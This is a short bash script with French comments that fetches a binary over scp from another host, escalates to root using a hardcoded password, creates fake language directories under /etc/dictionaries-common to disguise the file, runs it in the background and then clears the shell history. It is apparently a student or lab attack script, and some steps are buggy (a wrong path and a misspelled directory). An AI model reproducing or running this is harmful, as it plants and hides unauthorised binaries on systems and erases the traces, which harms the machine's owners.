#!/bin/bash

PASS="-stri-" 

# Connexion ssh
#sshpass -p -etu- ssh etu@$1



# si ça marche envoi du fichier
scp etu@172.16.48.19:/root/Desktop/Original2/dist/.../original2 /var/tmp/french

#connexion en root
su -
echo $PASS

# création de faux répertoires
mkdir /etc/dictionaries-common/french
mkdir /etc/dictionaries-common/english
mkdir /etc/dictionaries-common/spannish
mkdir /etc/dictionaries-common/russian


#déplace le fichier
mv /var/temp/ /etc/dictionaries-common/french/

#exécute le fichier
cd /etc/dictionaries-common/french/
./french&

#suppression de l'historique
history -c